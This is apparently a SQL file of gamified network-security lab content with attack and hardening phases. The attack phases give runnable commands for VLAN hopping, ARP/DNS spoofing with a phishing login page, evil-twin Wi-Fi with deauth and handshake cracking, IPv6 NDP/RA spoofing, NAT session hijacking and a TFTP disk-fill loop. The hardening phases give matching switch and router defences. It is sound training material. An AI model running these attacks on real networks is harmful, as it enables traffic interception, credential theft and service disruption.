ping -c 2 10.0.20.10        # crown jewels — should be unreachable right now
```
That silence is the "before" picture. Let''s change it.

## Step 2 — Ask the switch to trunk (Yersinia)

Yersinia ships with Kali and speaks DTP fluently. The GUI is the friendliest:

```
sudo yersinia -G
```

In the window: **Launch attack → DTP → "enabling trunking" → OK.**

Prefer the terminal? Use the interactive ncurses UI:

```
sudo yersinia -I
# press  g  → choose DTP
# press  x  → choose  1) enabling trunking
```

Yersinia now blasts DTP frames offering to trunk. SW1''s `dynamic auto` port accepts. Give it ~30 seconds.

<div class="callout tip">
<p>Peek at SW1 to watch it happen: <code>show interfaces fastEthernet 0/3 switchport</code> — <code>Operational Mode</code> will flip from <code>static access</code> to <code>trunk</code>. You just talked a switch into promoting your port.</p>
</div>

## Step 3 — Tap the VLAN you were never allowed into

Your port is a trunk now, so the wire is delivering 802.1Q-tagged frames for all VLANs. Build a sub-interface for VLAN 20 and give yourself an address in the server subnet:

```
sudo modprobe 8021q
sudo ip link add link eth0 name eth0.20 type vlan id 20
sudo ip addr add 10.0.20.66/24 dev eth0.20
sudo ip link set eth0.20 up
```

Now knock on the crown jewels'' door:

```
ping -c 4 10.0.20.10
```

<div class="callout tip">
<p><strong>💥 That''s the moment.</strong> Replies from <code>10.0.20.10</code> — a host in a VLAN your port had no business reaching — landing in your terminal. Fire up Wireshark on <code>eth0.20</code> and watch VLAN 20 traffic you were architecturally forbidden from seeing.</p>
</div>

<div class="achievement">
<span class="medal">👻</span>
<span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">VLAN Ghost — you''re in a VLAN that doesn''t know you exist</span></span>
</div>

<div class="boss">
<span class="tag">☠ BOSS FIGHT — optional, +300 XP</span>
<h3>Double Tagging: hop a VLAN with no trunk at all</h3>
<p>Switch-spoofing is loud. The subtle cousin is <strong>double tagging</strong>: you wrap a frame in <em>two</em> 802.1Q tags. The first switch strips the outer tag (if it matches the trunk''s <strong>native VLAN</strong>) and forwards the inner-tagged frame across the trunk — straight into VLAN 20. It''s one-way and blind, but it needs no DTP and no trunk on your port. It works precisely because the trunk''s native VLAN was left at the default.</p>
</div>

Craft it with Scapy. Outer tag = native VLAN (1), inner tag = target VLAN (20):

```
sudo python3
```
```python
from scapy.all import Ether, Dot1Q, IP, ICMP, sendp
pkt = ( Ether(dst="ff:ff:ff:ff:ff:ff")
        / Dot1Q(vlan=1)      # outer — matches native, gets stripped by SW1
        / Dot1Q(vlan=20)     # inner — survives, delivered into VLAN 20
        / IP(dst="10.0.20.10")
        / ICMP() )
sendp(pkt, iface="eth0", count=5)
```

You won''t see replies (the return path can''t tag its way back to you) — but sniff SRV1''s link and you''ll see your ICMP arriving inside VLAN 20. Injection into a segment you can''t even receive from. Nasty.

<div class="achievement">
<span class="medal">🎭</span>
<span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Double Agent — one frame, two tags, zero permission</span></span>
</div>

**Next:** you found the door wide open. Phase 3 is where you weld it shut — and prove the same attack now bounces off.
', is_pro_only=FALSE
WHERE lab_id=1 AND phase='attack';
UPDATE lab_phases SET title='Slam the Door', content='
<div class="mission">
<span class="tag">◈ Mission Briefing — Phase 3 of 3</span>
<h3>Slam the Door</h3>
<p>You walked in because two doors were left open: <strong>DTP</strong> was allowed to negotiate a trunk on a user port, and the trunk''s <strong>native VLAN</strong> was left at the lazy default. Close both. Then re-run Phase 2 and watch it fail — that failure is the whole reward.</p>
</div>

<div class="stats">
<span class="chip xp">✦ 800 XP</span>
<span class="chip diff">◆ Difficulty: ★★★☆☆</span>
<span class="chip time">◷ ~15 min</span>
<span class="chip loot">⚿ Loot: nonegotiate · native-VLAN hygiene · port lockdown</span>
</div>

<ul class="objectives">
<li>Force every user port to hard access mode and kill DTP</li>
<li>Move the trunk''s native VLAN off the default and prune it</li>
<li>Black-hole and shut down every unused port</li>
<li>Re-run the DTP attack → it fails</li>
<li>Re-run double tagging → it''s dropped</li>
</ul>

## Fix 1 — Nail down the user ports (kills switch-spoofing)

`switchport nonegotiate` disables DTP entirely — the port will never form a trunk by negotiation again. On **SW1**:

```
configure terminal
interface FastEthernet0/1
 switchport mode access
 switchport access vlan 10
 switchport nonegotiate
!
interface FastEthernet0/3
 switchport mode access
 switchport access vlan 10
 switchport nonegotiate
end
```

## Fix 2 — Fix the native VLAN (kills double tagging)

Set the trunk''s native VLAN to an unused parking VLAN, and allow only what belongs. On **both** switches'' trunk ports:

```
configure terminal
interface FastEthernet0/2
 switchport trunk native vlan 99
 switchport trunk allowed vlan 10,20,99
 switchport nonegotiate
end
```
Because your attacker frame''s outer tag (1) no longer matches the native VLAN (99), SW1 won''t strip-and-forward it. The double tag dies on arrival.

## Fix 3 — Black-hole the unused ports

An open unused port is a future incident. Park them all in a dead VLAN and shut them:

```
configure terminal
vlan 999
 name BLACKHOLE
!
interface range FastEthernet0/4 - 23
 switchport mode access
 switchport access vlan 999
 switchport nonegotiate
 shutdown
end
write memory
```

## Re-run the attack (the fun part)

Back on Kali, try Phase 2 again:

```
sudo yersinia -G      # Launch attack → DTP → enabling trunking
```
Then check SW1:
```
show interfaces fastEthernet 0/3 switchport
```

<div class="callout tip">
<p><code>Operational Mode: static access</code> and <code>Negotiation of Trunking: Off</code>. Yersinia is screaming DTP into a port that has stopped listening. No trunk, no VLAN hop. Your <code>eth0.20</code> sub-interface now pings into the void.</p>
</div>

## Prove it to the grader

These three checks are your victory conditions:

```
show interfaces trunk          ! only Fa0/2 (real trunk) — NOT Fa0/3
show interfaces fa0/3 switchport   ! Mode: access, Negotiation: Off
show vlan brief                ! unused ports parked in VLAN 999
```

<div class="achievement">
<span class="medal">🛡️</span>
<span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Gatekeeper — you closed the door you walked through</span></span>
</div>

<div class="mission">
<span class="tag">✔ LAB COMPLETE</span>
<h3>VLAN Warfare — cleared</h3>
<p>You built a network, became a switch, ghosted into a forbidden VLAN, injected a double-tagged frame with no trunk at all — and then made every one of those attacks bounce. That''s the entire discipline of switching security in one sitting: <code>build → attack → harden</code>.</p>
<p><strong>Total: 2800 XP</strong> · Next target: <code>Lab 02 — STP Sabotage</code>, where you steal the spanning-tree crown.</p>
</div>
', is_pro_only=FALSE
WHERE lab_id=1 AND phase='harden';
UPDATE lab_phases SET title='Unmask the Hidden Network', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Reveal the internal IPs behind the NAT</h3><p>NAT/PAT is not a security feature — it''s an address-conservation mechanism. An attacker on the outside can unmask the internal network through three techniques: (1) SIP/ALG inspection reveals private IPs in packet payloads, (2) port scanning shows the internal translation space by IP ID finger printing, (3) DNS zone transfer or direct probing of commonly-NATted internal ranges.</p></div>

<div class="stats"><span class="chip xp">✦ 500 XP</span><span class="chip diff">◆ Advanced</span><span class="chip time">◷ ~30 min</span><span class="chip loot">⬡ NAT leak · IP ID tracking · ALG inspection · DNS zone</span></div>

<div class="callout danger"><p><strong>Lab only.</strong> NAT provides zero security — it''s a routing workaround. Don''t rely on NAT for access control in production.</p></div>

## Objectives

<ul class="objectives">
<li>Use IP ID fingerprinting to estimate how many hosts are behind the NAT</li>
<li>Exploit NAT ALG (Application Layer Gateway) to leak internal IPs</li>
<li>Correlate timing patterns to map the internal network</li>
</ul>

## Method 1 — IP ID enumeration

Every IP packet has a 16-bit ID field. Many routers increment this ID per-host. By sending a probe to the external IP and reading the IP ID in the response, you can estimate the number of active sessions — and therefore hosts — behind the NAT.

From Kali (on 10.0.0.0/30, outside):
```
sudo hping3 -c 10 -i 1 10.0.0.1
```

Check the IP ID values in the responses. If they increase by more than 1 between consecutive replies, other hosts are generating traffic through the NAT. Over time, you can build a traffic pattern.

On R1:
```
show ip nat translations | count
```

Compare the real translation count to your estimate.

## Method 2 — NAT ALG exploration

Some NAT implementations include ALGs that inspect SIP (VoIP), FTP, RTSP, or DNS payloads and modify them — or worse, leak them. Send a crafted SIP INVITE to R1''s outside interface with Kali:

```
sudo apt install sip-tools
sudo sipsak -s sip:test@10.0.0.1 -v
```

If R1''s NAT ALG inspects and forwards the SIP traffic, the internal IP may be visible in the Via or Contact headers.

Check with tcpdump on R2:
```
sudo tcpdump -i eth0 -nn -X port 5060
```

## Method 3 — Timing correlation

If PC1 generates periodic traffic (keepalives, DNS refreshes, NTP), the NAT translation timestamps reveal a pattern. On R1:

```
show ip nat translations verbose
```

The `use` timestamp shows when each translation was last active. An attacker who can trigger an outbound connection from the internal host (e.g., via a CSRF/malicious ad on a browser behind the NAT) can correlate the timestamp spike with the trigger to confirm internal activity.

<div class="boss"><span class="tag">☠ BOSS FIGHT — optional, +200 XP</span><h3>NAT port prediction</h3><p>PAT assigns source ports sequentially or predictably. Capture 100 translations, map the port allocation pattern, then predict the next source port an internal host will use. Send a packet with the predicted source port before the internal host''s request — you''ve hijacked a NAT session. Use Scapy: <code>IP(src="10.0.0.1", dst="203.0.113.100")/...</code> with the predicted source port.</p></div>

<div class="achievement"><span class="medal">👁️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">NAT Whisperer — you counted hosts and traced sessions through the mask</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=9 AND phase='attack';
UPDATE lab_phases SET title='Poison the Cache', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Redirect the victim to your server</h3><p>DNS poisoning inserts a fake A record into the resolver''s cache. The victim asks for `www.netbreakerlab.com` and gets Kali''s IP instead. Three techniques: (1) ARP spoof + DNS response injection, (2) direct DNS response race (send a fake reply before the real one arrives), (3) mitmproxy/DNS spoof with ettercap.</p></div>

<div class="stats"><span class="chip xp">✦ 600 XP</span><span class="chip diff">◆ Advanced</span><span class="chip time">◷ ~30 min</span><span class="chip loot">⬡ DNS spoof · ARP spoof · ettercap · cache poisoning</span></div>

<div class="callout danger"><p><strong>Lab only.</strong> DNS poisoning in the wild can redirect users to phishing sites, malware downloads, or MITM proxies. This is a privilege escalation from network access to application-layer control.</p></div>

## Objectives

<ul class="objectives">
<li>Use ettercap''s dns_spoof plugin to redirect DNS queries to Kali</li>
<li>Start a fake web server on Kali to serve a phishing page</li>
<li>Confirm PC1 visits Kali instead of the real server</li>
</ul>

## Step 1 — Set up Kali as DNS spoofer

Edit `/etc/ettercap/etter.dns`:
```
www.netbreakerlab.com A 192.168.1.50
*.netbreakerlab.com A 192.168.1.50
```

This tells ettercap to respond to any DNS query for netbreakerlab.com with Kali''s IP (192.168.1.50).

## Step 2 — Start the fake web server

On Kali, create a simple phishing page:
```
echo "<html><h1>Login</h1><form>User: <input name=''user''>Pass: <input name=''pass'' type=''password''></form></html>" > /tmp/fake.html
sudo python3 -m http.server 80 --directory /tmp/ &
```

## Step 3 — Launch the ARP + DNS spoof

Ettercap with dns_spoof:
```
sudo ettercap -T -M arp:remote -i eth0 -P dns_spoof /192.168.1.1// /192.168.1.100//
```

This ARP spoofs both R1 (gateway) and PC1, positioning Kali as MITM. The dns_spoof plugin intercepts DNS queries and responds with the fake address.

## Step 4 — Verify

On PC1, clear DNS cache and re-resolve:
```
ping www.netbreakerlab.com
```

PC1 resolves to 192.168.1.50 (Kali). The HTTP request goes to Kali''s fake web server.

On Kali, check the ettercap output — you''ll see the DNS query intercepted and the spoofed response sent.

Check PC2 (real server) — no traffic arrives. The victim went to the wrong place.

<div class="callout tip"><p><strong>Manual approach without ettercap:</strong> Use <code>dnsspoof</code> from the dsniff suite: <code>sudo dnsspoof -i eth0 -f /etc/ettercap/etter.dns</code>. Same result, fewer dependencies.</p></div>

<div class="boss"><span class="tag">☠ BOSS FIGHT — optional, +200 XP</span><h3>DNS cache poisoning (Kaminsky-style)</h3><p>Instead of intercepting queries, send a flood of DNS queries for random subdomains (<code>aaaaaa.netbreakerlab.com</code>, <code>bbbbbb.netbreakerlab.com</code>...) and race the resolver by sending spoofed responses with an extra glue record that poisons the NS delegation for the entire domain. If successful, any subdomain of netbreakerlab.com resolves to your IP. Use Scapy to craft the packets: <code>DNS(qd=..., nscount=1, ns=DNSRR(rdata="ns1.attacker.com", ...), arcount=1, ar=DNSRR(rdata="192.168.1.50", ...))</code>.</p></div>

<div class="achievement"><span class="medal">💉</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">DNS Poisoner — you told the victim where to go and they believed you</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=10 AND phase='attack';
UPDATE lab_phases SET title='Clone the SSID', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Broadcast a twin that steals connections</h3><p>The Evil Twin attack: Kali broadcasts an access point with the same SSID (NetBreaker-WiFi) but a stronger signal. Clients auto-connect to the stronger signal. Once they''re on Kali''s AP, every packet passes through her — credentials, cookies, everything. No encryption mismatch because Kali sets the same WPA2-PSK or disables encryption and the client''s auto-fallback handles the rest.</p></div>

<div class="stats"><span class="chip xp">✦ 600 XP</span><span class="chip diff">◆ Advanced</span><span class="chip time">◷ ~30 min</span><span class="chip loot">⬡ Evil Twin · rogue AP · hostapd · deauth · WPA handshake capture</span></div>

<div class="callout danger"><p><strong>Sandbox only.</strong> Running an Evil Twin in the real world is illegal in most jurisdictions. This is the crown jewel of wireless social engineering — practice only in GNS3.</p></div>

## Objectives

<ul class="objectives">
<li>Use hostapd on Kali to create a rogue AP with the same SSID</li>
<li>Deauthenticate the real client to force it to reconnect</li>
<li>Capture the WPA2 handshake and sniff the victim''s traffic</li>
</ul>

## Step 1 — Configure Kali as an AP

On Kali:
```
sudo apt update && sudo apt install -y hostapd dnsmasq
sudo systemctl stop network-manager
```

Create `/etc/hostapd/hostapd.conf`:
```
interface=wlan0
driver=nl80211
ssid=NetBreaker-WiFi
hw_mode=g
channel=6
wpa=2
wpa_passphrase=NetBreakerLab
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
```

Start hostapd:
```
sudo hostapd -B /etc/hostapd/hostapd.conf
```

Kali now broadcasts the same SSID. If the signal is stronger, clients may roam to it.

## Step 2 — Force disconnection (deauth attack)

From a second wireless interface (or use wlan0 with aireplay-ng):
```
sudo aireplay-ng -0 5 -a AP1_BSSID -c PC1_STATION_MAC wlan0
```

This sends 5 deauthentication packets to PC1, forcing it to reconnect. When it scans for NetBreaker-WiFi, Kali''s AP may be selected (stronger signal or same SSID preference).

## Step 3 — Traffic capture

On Kali, start tcpdump:
```
sudo tcpdump -i wlan0 -nn -X
```

From PC1, access a website or ping. Kali sees everything.

## Step 4 — WPA2 handshake capture (bonus)

Even if the client stays on the real AP, you can capture the 4-way handshake:
```
sudo airodump-ng -c 6 --bssid AP1_BSSID -w capture wlan0
sudo aireplay-ng -0 2 -a AP1_BSSID -c PC1_STATION_MAC wlan0
```

The handshake is saved in capture.cap. Crack it offline:
```
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap
```

<div class="callout info"><p><strong>In GNS3 without wireless:</strong> Simulate the Evil Twin by creating a second "AP" (VLAN + router on Kali) that claims to be 192.168.10.1 and sets up NAT to the real network. The client''s gateway becomes Kali — same effect as Evil Twin, just over wire.</p></div>

<div class="achievement"><span class="medal">👥</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Twin Maker — you cloned a network and clients chose you over the original</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=13 AND phase='attack';
UPDATE lab_phases SET title='Spoof the Neighbor', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>IPv6 ARP poisoning — the NDP edition</h3><p>NDP has no authentication. A forged Neighbor Advertisement can redirect traffic just like ARP spoofing in IPv4. Additionally, Router Advertisement spoofing lets you become the default gateway — all traffic leaves through Kali. IPv6 also introduces SLAAC attacks: rogue RAs can assign DNS servers or set prefixes that route traffic through the attacker.</p></div>

<div class="stats"><span class="chip xp">✦ 600 XP</span><span class="chip diff">◆ Advanced</span><span class="chip time">◷ ~35 min</span><span class="chip loot">⬡ NDP spoof · RA flood · SLAAC attack · mitm6</span></div>

<div class="callout danger"><p><strong>Lab only.</strong> NDP spoofing is the IPv6 equivalent of ARP poisoning. In production, it gives the attacker a front-row seat to every IPv6 conversation.</p></div>

## Objectives

<ul class="objectives">
<li>Spoof a Neighbor Advertisement to redirect PC1''s traffic for PC2 through Kali</li>
<li>Use mitm6 to automate NDP spoofing and DNS hijacking</li>
<li>Send a rogue Router Advertisement to become the default gateway</li>
</ul>

## Method 1 — NDP spoofing with ndpspoof or Scapy

Kali comes with `ndpspoof` (part of dsniff suite):
```
sudo ndpspoof -i eth0 -t 2001:db8:1::1 -d 2001:db8:1::100
```

This sends forged NA packets claiming R1''s IPv6 maps to Kali''s MAC, and PC1''s IPv6 maps to Kali''s MAC. Both sides think Kali is the other party.

Check PC1''s NDP cache:
```
ip -6 neigh show
```

2001:db8:1::1 now points to Kali''s MAC.

From PC1:
```
ping6 2001:db8:1::200
```

Traffic goes through Kali. On Kali:
```
sudo tcpdump -i eth0 -nn -X icmp6
```

You see the ping traffic between PC1 and PC2.

## Method 2 — Rogue Router Advertisement

A more powerful attack: announce yourself as the default gateway with a lower prefix preference:
```
sudo radvd -C /dev/null -d 5 &
```
Or craft with Scapy:
```
sendp(Ether(dst="33:33:00:00:00:01")/IPv6(dst="ff02::1")/ICMPv6ND_RA(router_lifetime=1800, reachable_time=0, retrans_timer=0)/ICMPv6NDOptPrefixInfo(prefix="2001:db8:1::", prefix_len=64, valid_lifetime=7200, preferred_lifetime=3600), loop=1, inter=5)
```

If R1''s RA is less frequent than Kali''s (or Kali sends them faster), hosts update their default route to Kali.

## Method 3 — mitm6 (automated)

```
sudo apt install mitm6
sudo mitm6 -i eth0 -d netbreakerlab.local
```

mitm6 automatically performs NDP spoofing + DNS hijacking for the domain.

<div class="boss"><span class="tag">☠ BOSS FIGHT — optional, +250 XP</span><h3>SLAAC DNS poisoning</h3><p>IPv6 Router Advertisements can include Recursive DNS Server (RDNSS) options. Send an RA with a rogue DNS server pointing to Kali. Every host that processes this RA will use Kali''s DNS server. Combine with local DNS spoofing (see Lab 10) for complete traffic hijacking. Use Scapy: <code>ICMPv6NDOptRDNSS(lifetime=300, addresses=["2001:db8:1::50"])</code>.</p></div>

<div class="achievement"><span class="medal">🔄</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">NDP Nemesis — you made IPv6 neighbors trust a liar</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=14 AND phase='attack';
UPDATE lab_phases SET title='TFTP Config Theft', content='
<b>Attack 1 — TFTP config pull:</b> If TFTP server is misconfigured, anyone can pull files: <code>tftp 192.168.1.1 69</code> → <code>get running-config</code>. <b>Attack 2 — TFTP DoS:</b> Flood TFTP write requests to fill disk: <code>for i in seq 1 1000; do echo "put dummy$i" | tftp 192.168.1.1; done</code>. <b>Attack 3 — Malicious IOS upgrade:</b> Upload a corrupt IOS image via TFTP and trigger reload. ', is_pro_only=TRUE
WHERE lab_id=34 AND phase='attack';
UPDATE lab_phases SET title='Lock the Ports', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Make the switch stop trusting</h3><p>Cisco''s port-security feature lets you tell the switch exactly how many MACs a port is allowed to learn — and what happens when the limit is exceeded. Set it to 1 (one device per port), and macof''s flood becomes a port shutdown instead of a CAM overflow.</p></div>

<div class="stats"><span class="chip xp">✦ 400 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~15 min</span><span class="chip loot">⬡ port-security · errdisable</span></div>

## Objectives

<ul class="objectives">
<li>Enable port-security on Kali''s access port with a MAC limit of 1</li>
<li>Set the violation mode to shutdown</li>
<li>Re-run macof — the port err-disables instantly</li>
</ul>

## Step 1 — Enable port security

On SW1, enable port security on the port Kali uses:
```
configure terminal
interface gi0/3
 switchport port-security
 switchport port-security maximum 1
 switchport port-security violation shutdown
 switchport port-security mac-address sticky
end
```

What this does:
- **maximum 1**: only 1 MAC address may be learned on this port
- **violation shutdown**: if exceeded, the port goes err-disable
- **mac-address sticky**: the first MAC seen becomes the "allowed" one

## Step 2 — Re-run the attack

Back on Kali:
```
sudo macof -i eth0
```

Within one second, macof transmits a frame with a different source MAC than the one SW1 just learned. The port slams into err-disable instantly.

Check on SW1:
```
show interfaces status err-disabled
show interfaces gi0/3
```

`Gi0/3` shows `err-disabled`. The flood stopped at the port — the CAM table never filled.

<div class="callout info"><p><strong>Recovery:</strong> <code>shutdown</code> then <code>no shutdown</code> on the interface. Enable auto-recovery with <code>errdisable recovery cause psecure-violation</code> and the port comes back after 300 seconds.</p></div>

## Step 3 — Verify

```
show port-security interface gi0/3
show port-security
```

You''ll see the violation count incremented and the action set to Shutdown.

<div class="callout tip"><p>Use <code>switchport port-security violation restrict</code> instead of <code>shutdown</code> if you want the port to stay up but drop offending traffic — useful for monitoring without breaking connectivity.</p></div>

<div class="achievement"><span class="medal">🛡️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Port Warden — one MAC per port, no exceptions</span></span></div>
', is_pro_only=FALSE
WHERE lab_id=3 AND phase='harden';
UPDATE lab_phases SET title='Stand Up the DHCP Server', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Give the network a leg to stand on</h3><p>DHCP hands out IP addresses automatically — no static config needed. A Cisco router configured as a DHCP server will serve a pool of addresses to any host that asks. In this phase you build that server, confirm clients get addresses, and note the pool size. In the attack phase, you''re going to exhaust that pool and replace it with one of your own.</p></div>

<div class="stats"><span class="chip xp">✦ 300 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~25 min</span><span class="chip loot">⬡ DHCP pool · address lease</span></div>

## The topology

| Device | Role | Image |
|---|---|---|
| R1 | DHCP server + router | Cisco IOSv |
| SW1 | Access switch | IOSvL2 |
| PC1 | Legitimate DHCP client | VPCS |
| KALI | Starvation cannon | Kali |

Cable: R1→SW1 Gi0/24 (trunk), PC1→SW1 Gi0/1 (access), KALI→SW1 Gi0/3 (access).

## Objectives

<ul class="objectives">
<li>Configure R1 as a DHCP server with a pool of 10 addresses (192.168.1.10–.19)</li>
<li>Confirm PC1 gets a lease from the pool</li>
<li>Check pool utilization</li>
</ul>

## Step 1 — Interface config

On R1:
```
configure terminal
interface gi0/0
 ip address 192.168.1.1 255.255.255.0
 no shutdown
end
```

On SW1:
```
configure terminal
vlan 1
 exit
interface gi0/1
 switchport mode access
 switchport access vlan 1
 no shutdown
interface gi0/3
 switchport mode access
 switchport access vlan 1
 no shutdown
interface gi0/24
 switchport mode trunk
 no shutdown
end
```

## Step 2 — DHCP pool

On R1:
```
configure terminal
ip dhcp pool LAN
 network 192.168.1.0 255.255.255.0
 default-router 192.168.1.1
 dns-server 8.8.8.8
 lease 1
end
```

This creates a /24 pool. With a single /24, there are ~253 usable addresses.

## Step 3 — Test

On PC1 (VPCS):
```
ip dhcp
show ip
```

You should see 192.168.1.x assigned. On R1, check:
```
show ip dhcp binding
show ip dhcp pool
```

Note the pool size and how many addresses are used. That headroom is what you''re about to fill.

<div class="achievement"><span class="medal">🏗️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Lease Lord — you gave the network life</span></span></div>
', is_pro_only=FALSE
WHERE lab_id=8 AND phase='build';
UPDATE lab_phases SET title='Harden the Pool', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Make the network immune to fake IP giveaways</h3><p>Cisco''s DHCP Snooping and Dynamic ARP Inspection (DAI) are the one-two punch against rogue DHCP. DHCP Snooping marks trusted ports (where legitimate servers live) and ignores DHCP offers from untrusted ports. DAI validates every ARP packet against the DHCP binding table — forged gateways get dropped.</p></div>

<div class="stats"><span class="chip xp">✦ 500 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~25 min</span><span class="chip loot">⬡ DHCP snooping · DAI · trusted/untrusted</span></div>

## Objectives

<ul class="objectives">
<li>Enable DHCP snooping globally and on VLAN 1</li>
<li>Mark the uplink to R1 as trusted, access ports as untrusted</li>
<li>Re-run the rogue DHCP server — its offers are dropped</li>
</ul>

## Step 1 — DHCP Snooping

On SW1:
```
configure terminal
ip dhcp snooping
ip dhcp snooping vlan 1
interface gi0/24
 ip dhcp snooping trust
end
```

Port Gi0/24 (uplink to R1) is **trusted** — DHCP offers from this port are accepted. Every other port is **untrusted** by default — DHCP offers from them are silently dropped.

## Step 2 — Rate-limit (optional)

Unlimited DHCP requests from a single port can still DoS the switch CPU:
```
configure terminal
interface gi0/1
 ip dhcp snooping limit rate 5
interface gi0/3
 ip dhcp snooping limit rate 5
end
```

5 packets/second caps yersinia''s flood.

## Step 3 — DAI (Dynamic ARP Inspection)

```
configure terminal
ip arp inspection vlan 1
interface gi0/24
 ip arp inspection trust
end
```

DAI cross-checks every ARP reply against the DHCP snooping binding table. A fake gateway ARP from Kali gets dropped because no binding exists for 192.168.1.100 on that port.

## Step 4 — Re-run the attacks

Starve attempt:
```
sudo yersinia dhcp -attack 1 -interface eth0
```

Check SW1:
```
show ip dhcp snooping binding
show ip arp inspection statistics vlan 1
```

The rate limit throttles yersinia. The snooping table only shows R1''s offers. Rogue DHCP offers from Kali are dropped by the untrusted port.

Rogue server attempt:
```
sudo dhcpd -f -d eth0 &
```

Check SW1:
```
debug ip dhcp snooping
```

The debug shows incoming DHCPOFFER on Gi0/3 — but the packet is **dropped** because the port is untrusted.

<div class="callout info"><p><strong>Verification:</strong> <code>show ip dhcp snooping</code> shows the trusted/untrusted port map. <code>show ip arp inspection interfaces</code> shows the ARP inspection state. Both should be active.</p></div>

<div class="achievement"><span class="medal">🛡️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Snoop Proof — the only DHCP server that matters is the one you authorized</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=8 AND phase='harden';
UPDATE lab_phases SET title='Authenticate the Virtual Gateway', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Lock HSRP updates behind a shared secret</h3><p>HSRP supports MD5 authentication (version 2) or a simple plain-text key. With authentication configured, every HSRP packet must carry the correct key digest. Yersinia''s forged packet lacks the key — the routers ignore it and keep their Active/Standby roles.</p></div>

<div class="stats"><span class="chip xp">✦ 300 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~10 min</span><span class="chip loot">⬡ HSRP MD5 auth · standby key</span></div>

## Objectives

<ul class="objectives">
<li>Enable HSRP MD5 authentication on R1 and R2</li>
<li>Re-run the HSRP attack — Kali fails to take over</li>
</ul>

## Step 1 — Add authentication

On R1:
```
configure terminal
interface gi0/0
 standby 1 authentication md5 key-string NetBreakerLab
end
```

On R2:
```
configure terminal
interface gi0/0
 standby 1 authentication md5 key-string NetBreakerLab
end
```

## Step 2 — Verify

On R1:
```
show standby
```

Authentication is shown as `MD5`.

## Step 3 — Re-run the attack

```
sudo yersinia hsrp -attack 1 -interface eth0
```

Check R1:
```
show standby
```

R1 remains Active. Kali''s forged HSRP packets are silently dropped — no matching MD5 digest.

On Kali, run tcpdump:
```
sudo tcpdump -i eth0 -nn port 1985
```

Port 1985 is HSRP multicast (224.0.0.2). You''ll see R1 and R2 talking to each other — but Kali''s own HSRP packets go unanswered.

<div class="callout tip"><p>HSRPv2 uses MD5. For production, use the strongest key available. Avoid the plain-text option (<code>authentication text</code>) — it''s no protection at all since the key is visible in the packet.</p></div>

<div class="achievement"><span class="medal">🛡️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Redundancy Warden — the backup gateway is real, but only the authorized team controls it</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=5 AND phase='harden';
UPDATE lab_phases SET title='Harden IP Addressing', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Protect the address space</h3><p>Defenses: uRPF to prevent spoofing, DHCP snooping to prevent exhaustion, IP source guard to validate source IPs at the port level.</p></div>

<div class="stats"><span class="chip xp">✦ 250 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~15 min</span><span class="chip loot">⬡ uRPF · IP source guard · DHCP snoop</span></div>

## Step 1 — uRPF

On R1:
```
configure terminal
interface gi0/0
 ip verify unicast source reachable-via rx
end
```

Now a packet with spoofed source 192.168.10.10 arriving on gi0/1 (LAN B side) is dropped — because 192.168.10.0/24 is reachable via gi0/0, not gi0/1.

## Step 2 — DHCP snooping + IP source guard

On SW1:
```
configure terminal
ip dhcp snooping vlan 1
interface gi0/1
 ip verify source port-security
end
```

The binding table learns which IP → MAC → port combos are valid. Any packet with an unregistered source IP is dropped at the switch port.

## Step 3 — Verify

Try the attacks again. uRPF drops the spoofed SYN. DHCP snooping blocks the DHCP starvation. IP source guard drops any packet with an unregistered source address.

<div class="achievement"><span class="medal">🛡️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Address Guardian — the IP space is validated at every hop</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=19 AND phase='harden';
UPDATE lab_phases SET title='Kill Telnet, Keep SSH', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Close the cleartext door forever</h3><p>The fix is simple: disable Telnet on the VTY lines so only SSH is allowed. Then harden SSH itself with key-only authentication. Once you''ve seen the difference on the wire, you''ll never leave Telnet on again.</p></div>

<div class="stats"><span class="chip xp">✦ 300 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~10 min</span><span class="chip loot">⬡ VTY restriction · SSH hardening</span></div>

## Objectives

<ul class="objectives">
<li>Remove Telnet from VTY transport</li>
<li>Verify Telnet connections are rejected</li>
<li>Harden SSH with key-only auth</li>
</ul>

## Step 1 — Disable Telnet

On R1:
```
configure terminal
line vty 0 4
 transport input ssh
end
```

Now only SSH is allowed. Telnet connections are rejected.

## Step 2 — Verify

From Kali:
```
telnet 192.168.1.1
```

You should get "Connection refused" or "Connection closed by foreign host."

```
ssh sshuser@192.168.1.1
```

SSH still works. Good.

## Step 3 — Harden SSH (bonus)

On R1:
```
configure terminal
ip ssh authentication-retries 2
ip ssh time-out 30
line vty 0 4
 exec-timeout 10
end
